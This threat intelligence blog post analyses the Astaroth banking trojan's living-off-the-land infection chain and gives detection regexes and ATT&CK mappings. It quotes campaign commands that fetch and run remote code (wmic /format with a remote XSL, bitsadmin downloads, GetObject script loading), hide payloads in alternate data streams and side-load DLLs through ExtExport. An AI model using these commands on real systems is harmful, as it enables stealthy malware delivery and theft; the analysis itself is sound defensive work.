          <div class="container-lg mb-0">
            <div class="row">
              <div class="col-12">
                <h5>
                                      <span class="resource-type">Threat Intelligence</span><br>
                  
                  <span class="pre-title center-text">
                                          <span class="posted-on"><time class="entry-date published updated" datetime="2021-11-17T13:53:40+00:00">November 17, 2021</time></span>                                      </span>

                                  </h5>
              </div>

      <article id="post-478" class="resource post-478 armor-resource type-armor-resource status-publish hentry armor-resource-type-threat-intelligence armor-resource-topic-ransomware armor-resource-topic-threat-resistance-unit">
    
        <div class="entry-content">
    <section>
<div class="container-lg mt-0">
<div class="row">
<div class="col-12">
<p>We’re continuing our blog series about Living-off-the-Land (LotL) attacks by focusing on a particularly fast-moving malware called Astaroth. <a href="https://www.armor.com/resources/threat-intelligence/living-off-the-land-attacks/">Click here</a> to view the first post, which goes into the characteristics of LotL binaries and how they work.</p>
<p>First spotted in the wild in 2017, Astaroth is a highly prevalent, information-stealing Latin American banking trojan. It is written in Delphi and has some innovative execution and attack techniques. Originally, this malware variant targeted Brazilian users, but Astaroth now targets users both in North America and Europe.</p>
<figure id="attachment_20739" aria-describedby="caption-attachment-20739" style="width: 624px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-20739 size-full lazy loaded img-fluid" src="/wp-content/uploads/2025/08/astaroth-heat-map.png" alt="Image of Astaroth Heat Map" width="624" height="382" ><figcaption id="caption-attachment-20739" class="wp-caption-text"><em>Astaroth Heat map (Source: “Microsoft”)</em></figcaption></figure>
<p>As for its LotL component, it’s interesting to note that at no point during the attack chain is any file run that’s not a system tool. This malware completely lives of the land!</p>
<p>Multiple campaigns with two different versions have been observed in the wild and one of the most significant updates is the use of Alternate Data Stream (ADS), which Astaroth abuses at several stages to perform various activities. ADS is a file attribute that allows a user to attach data to an existing file. The stream data and its size are not visible in File Explorer. Attackers hide binary data inside the ADS of the file desktop.ini without changing the file size.</p>
<p>Recently, a newer version was found in the wild, abusing NTFS Alternate Data Streams (ADS) to store the content of malicious payloads downloaded during execution. The malware is highly modular, with a very complex execution flow. The main vector used by the group is sending malicious files in compressed format, attached to email. File types vary from VBS to LNK; the most recent campaign started to attach an HTML file which executes JavaScript for downloading a malicious file.</p>
<p>The malware relies on anti-debugging, anti-virtualization, and anti-emulation tricks, besides the usage of process hollowing, living-off-the-land binaries (LotLBin), and NTFS Alternate Data Streams to store downloaded payloads. These payloads come from cloud hosting services such as Cloudflare’s Workers, Amazon AWS, and also popular websites like YouTube and Facebook, where they store C2 information.</p>
<p>Additional Astaroth sophisticated, multi-stage processes include:</p>
<ul>
<li>Highly obfuscated JScript staged downloaders.</li>
<li>.LNK files to retrieve the malware payload once the user clicks an embedded link in the spam email.</li>
<li>The malware uses various fileless techniques, injects into numerous legitimate Windows processes, and adopts the use of living-off-the-land tactics.</li>
<li>The abuse of different LotLBins such as “extexport.exe.”</li>
<li>Information targeted by Astaroth includes financial data, sensitive browser data (passwords/credentials), SSH, and email credentials. Upon retrieval, the information is typically encrypted, then exfiltrated via an HTTPS POST to the attacker’s C2 server.</li>
<li>Abuse of Alternate Data Streams (ADS).</li>
<li>Astaroth implements a robust series of anti-analysis/evasion techniques, among the most thorough we’ve seen recently.</li>
<li>Novel use of YouTube channels for C2 helps evade detection by leveraging a commonly used service on commonly used ports.</li>
</ul>
<p>The complex attack chain, which involves the use of multiple LotLBins, results in the eventual loading of the Astaroth malware directly in memory.</p>
<h2><strong>Analysis of Astaroth:</strong>&nbsp;<strong>The</strong> <strong>Infection Process</strong></h2>
<h3><strong>Step 1: Delivery Stage</strong></h3>
<p>Astaroth relies heavily on emails containing a malicious file in a compressed format. These emails attempt to deceive the victim by maintaining a corporate appearance and emulating legitimate business requests, such as providing information regarding the COVID-19 pandemic or notifying a client about a package sent via courier services.</p>
<p>The main vector used by the group is sending malicious files in compressed format, attached to email. File types vary from VBS to LNK; the most recent campaign started to attach an HTML file which executes JavaScript for downloading a malicious file.</p>
<p>&nbsp;</p>
<figure id="attachment_20741" aria-describedby="caption-attachment-20741" style="width: 623px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="img-fluid wp-image-20741 size-full lazy loaded" src="/wp-content/uploads/2025/08/purchase-invoice.png" alt="Sample purchase invoice" width="623" height="442" ><figcaption id="caption-attachment-20741" class="wp-caption-text"><em>Sample of a purchase invoice – another one of Astaroth’s tricks for luring victims. (Source: “SecureList“)</em></figcaption></figure>
<p>&nbsp;</p>
<figure id="attachment_20740" aria-describedby="caption-attachment-20740" style="width: 623px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-20740 size-full lazy loaded img-fluid" src="/wp-content/uploads/2025/08/email.png" alt="Sample email" width="623" height="247" ><figcaption id="caption-attachment-20740" class="wp-caption-text"><em>Sample email used in the latest Astaroth attacks. (Source: “Microsoft“)</em></figcaption></figure>
<h4><strong>1st Campaign</strong></h4>
<p>A malicious link in a spear-phishing email lead to an LNK file. The LNK file has batch commands embedded in the LNK which execute the WMIC tool with the “/Format” parameter.</p>
<p>(This method is used to invoke an XSL (eXtensible Stylesheet Language) local or remote file, which may contain any scripting. In this case, they used JavaScript.)</p>
<p><strong>Command Example:</strong></p>
<p><img decoding="async" loading="lazy" class="alignnone size-full wp-image-20742 lazy loaded img-fluid" src="/wp-content/uploads/2025/08/command-example.png" alt="Sample of a Purchase Invoice" width="624" height="41" ></p>
<p><strong>Command Example:</strong></p>
<p><em>wmic os get /format:”hxxps://webserver/payload.xsl</em></p>
<p>The use of the parameter “<strong>/format”</strong> causes WMIC to download the file “<strong>v.txt,”</strong> which is an XSL file hosted on a legitimate-looking domain. The XSL file hosts an obfuscated JavaScript that is automatically run by WMIC.</p>
<p>This JavaScript code then runs WMIC again to download another .txt file, which is essentially another XSL file containing an obfuscated JavaScript code, which then uses the Bitsadmin, Certutil, and Regsvr32 tools for the next steps.</p>
<p><strong>Command Example:</strong></p>
<p><em>bitsadmin.exe /transfer 24653 /priority foreground https://{anotherurl}/{random}.gif.zip c:\Users\Public\Libraries\hwds{random}.gif</em></p>
<h4><strong>2nd Campaign</strong></h4>
<p>In a separate campaign, the LNK file runs an obfuscated BAT command line. Then the BAT command drops a single-line JavaScript file to the Pictures folder and invokes explorer.exe to run the JavaScript file.</p>
<p><strong>Command Example:</strong></p>
<p>The dropped one-liner script uses the GetObject technique to fetch and run the much larger main JavaScript directly in the memory.</p>
<p><strong>Command Example:</strong></p>
<p><em><u>%windir%\Explorer /c GetObject(‘script:https://{urlthatholdsthemainjavascript}’)</u></em></p>
<h3><strong>Step 2: BITSAdmin Abuse (</strong><strong>1<sup>st</sup> Campaign</strong><strong>)</strong></h3>
<p>BITSAdmin then uses a benign looking command-line to download multiple binary blobs from a command-and-control (C2) server:</p>
<p>The payloads are Base64-encoded and have file names like: falxconxrenwb.~, falxconxrenw64.~, falxconxrenwxa.~, falxconxrenwxb.~, falxconxrenw98.~, falxconxrenwgx.gif, falxfonxrenwg.gif.</p>
<p>Then the <strong>Certutil </strong>system tool is used to decode the downloaded payloads:</p>
<p>Only a couple of files are decoded to a DLL; most are still encrypted/obfuscated. But one of the decoded payload files (a DLL) is run within the context of the <strong>Regsvr32 </strong>system tool:</p>
<h3><strong>Step 2: Alternate Data Streams Abuse (</strong><strong>2<sup>nd</sup> Campaign</strong><strong>)</strong></h3>
<p>A newer version of <strong>Astaroth</strong> malware started to use a new technique for storing downloaded payloads in NTFS Alternate Data Streams (ADS of&nbsp;desktop.ini.) to conceal their presence in the system. <strong>Instead of using</strong><strong> BITSAdmin, </strong>the usage of ADS helps to hide the file in the system since it will not appear in Explorer, etc.</p>
<p><strong>Command Example:</strong></p>
<p><em>cmd /c type C:\Users\Public\Libraries\hwds\{random}.gif &gt; c:\Users\Public\libraries\hwds\desktop.ini:{random}.gif &amp;&amp; erase C:\Users\Public\Libraries\hwds\{random}.gif</em></p>
<h3><strong>Step 3. DLL Hijack</strong></h3>
<p>Astaroth will launch itself by using DLL Search Order Hijacking. There were various processes being used by <strong>Astaroth</strong> at this step; in a recent version of the malware, it used <strong>ExtExport.exe</strong>, which is related to Internet Explorer.</p>
<p>The DLLs that were downloaded before in the previous step will be named with a known library that are loaded by <strong>ExtExport</strong> on its execution: <strong>mozcrt19.dll, mozsqlite3.dll, sqlite3.dll;</strong> or <strong>&lt;random&gt;64a.dll </strong><strong>and</strong><strong> &lt;random&gt;64b.dll.</strong></p>
<p>They load these two DLLs by passing an attacker-controlled path to the tool. The tool searches for any DLL with the following file names: <strong>mozcrt19.dll, mozsqlite3.dll, or sqlite3.dll, </strong><strong>and it is</strong> <strong>loaded by</strong><strong> ExtExport.exe.</strong></p>
<p><strong>Command Example:</strong></p>
<p><em>cmd.exe /c cd “c:\Program Files\Internet Explorer”</em></p>
<p><em>&amp;&amp; ExtExport.exe c:\Users\Public\Libraries\hwds {ordinal} {ordinal}</em></p>
<h3><strong>Step 4. Loading Astaroth in Memory as a DLL (Userinit Abuse)</strong></h3>
<ol start="19">
<li>The newly loaded DLL (mozcrt19.dll, mozsqlite3.dll, or sqlite3.dll) is a proxy that reads three binary ADS streams (<strong>ini:masihaddajjalxa</strong>.~, <strong>desktop.ini:masihaddajjalxb</strong>.~, <strong>desktop.ini:masihaddajjalxc</strong>.~) and combines these into a DLL.</li>
<li>This new DLL is a proxy that reads and decrypts <strong><em>another</em></strong> ADS stream (<strong>ini:masihaddajjalgx.gif</strong>) into a DLL. This DLL is injected into <strong>userinit.exe</strong> using the process hollowing technique.</li>
<li>The new DLL that is loaded inside <strong>exe</strong> is <strong><em>again</em></strong> a proxy that reads and decrypts <strong><em>another</em></strong> ADS stream (<strong>desktop.ini:masihaddajjalg.gif</strong>) into a DLL.<br />
This DLL is the actual&nbsp;<strong>Astaroth</strong>and is&nbsp;<strong>reflectively loaded inside</strong><strong> userinit.exe</strong>.</li>
<li>Hence, <strong>Astaroth</strong> never touches the disk and is loaded directly in memory, making it very evasive.</li>
</ol>
<h3></h3>
<h3><strong>Detections:</strong></h3>
<ul>
<li>Searching for the parent process: <em>exe</em> that spawns <em>bitsadmin.exe</em> and <em>extexport.exe</em>.</li>
<li>Process creation event 4688 with the command line mentioned using the following strings (<em>regex</em>):</li>
</ul>
<p>\/c getobject\(\”|\’script:http</p>
<p>\/c type [a-z]:\\users.*\&gt;.*[a-z]:\\users\\.*\.*.:</p>
<p>\/c.*script\.exe.*\..*:.*\.js</p>
<p>&gt;.*mozcrt19\.dll</p>
<p>&gt;.*mozsqlite3\.dll</p>
<p>&gt;.*sqlite3\.dll\.dll</p>
<p>OR together, for example:&nbsp; &gt;.*moz.*\d{1,2}\.dll|&gt;.*sqlite3\.dll\.dll</p>
<p>extexport\.exe.*[a-z]:\\</p>
<p>&nbsp;</p>
<h3><strong>Hunting Notes:</strong></h3>
<ul>
<li>One characteristic of the early campaigns was the use of actor-owned domains along with subdomains.<br />
<strong>Example URL:</strong> hxxp://wer371ioy8[.]winningeleven3[.]re/CSVS00A1V53I0QH9KUH87UNC03A1S/Arquivo.2809.PDF</li>
<li>Variable names, function names, and parameter names were changed from their original, randomly generated values to improve readability and make the analysis process more efficient.</li>
</ul>
<h3><strong>Analysis Notes:</strong></h3>
<p>The threat actors behind these campaigns were so concerned with evasion they included dozens of checks, including those rarely seen in most malware, including, but not limited to the following:</p>
<ul>
<li>It leverages CreateToolhelp32Snapshot to identify virtual machine guest additions that may be installed on the system for both VirtualBox and VMware.</li>
<li>It looks for the presence of hardware devices that are commonly seen on virtual machines.</li>
<li>It checks the value of the SystemBiosDate, which is stored in the Windows registry (HKLM\HARDWARE\DESCRIPTIONS\System\SystemBios\Date) to determine if the value matches “06/23/99,” which is the default value for virtual machines within VirtualBox.</li>
<li>It attempts to identify the following applications which are commonly used for malware analysis: OllyDbg, ImmunityDebugger, WinDbg, IDA Pro, Process Explorer, Process Monitor, RegMon, FileMon, TCPView,A utoruns, Wireshark, Dumpcap, Process Hacker, SysAnalyzer, HookExplorer, SysInspector, ImportREC, PETools, LordPE, Joebox, Sandbox, x32dbg.</li>
<li>If any of the checks fail, the malware forcibly reboots the system using the following command-line syntax: <em>“cmd.exe /c shutdown -r -t 3 -f.”</em></li>
</ul>
<h3><strong>ATT&amp;CK Mapping:</strong></h3>
<p>T1192 – Spearphishing link<br />
T1023 – Shortcut modification<br />
T1064 – Scripting<br />
T1027 – Obfuscated files or information<br />
T1197 – BITS Jobs<br />
T1105 – Remote File Copy<br />
T1096 – NTFS File Attributes<br />
TA0005 – Defense Evasion<br />
T1073 – DLL Side-Loading<br />
T1218 – Signed Binary Proxy Execution<br />
T1129 – Execution through Module load<br />
T1140 – Deobfuscate/Decode Files or information<br />
T1093 – Process Hollowing<br />
T1055 – Process Injection</p>
<p>As you can see, Astaroth is a highly invasive malware that employs complex evasive techniques to survive undetected. To better understand how these attacks happen and how to prevent them in your organization, read our article, “<a href="https://www.armor.com/resources/threat-intelligence/living-off-the-land-attacks/">Living-Off-the-Land Attacks</a>.”</p>
